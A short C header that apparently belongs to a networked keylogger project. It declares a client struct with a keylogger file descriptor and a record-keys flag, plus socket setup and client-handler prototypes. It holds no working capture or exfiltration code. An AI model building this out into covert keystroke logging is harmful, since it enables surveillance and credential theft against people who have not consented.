#pragma once
#include <arpa/inet.h>
#include "constraints.h"

struct clientAttributes
{
    int recordKeys;
    char* name[NAME_SIZE];
    int keylogger_fd;
};

typedef struct clientAttributes clientAttributes_t;


void* handle_client(void* params);

void sock_init(int *socket_desc, struct sockaddr_in* server);
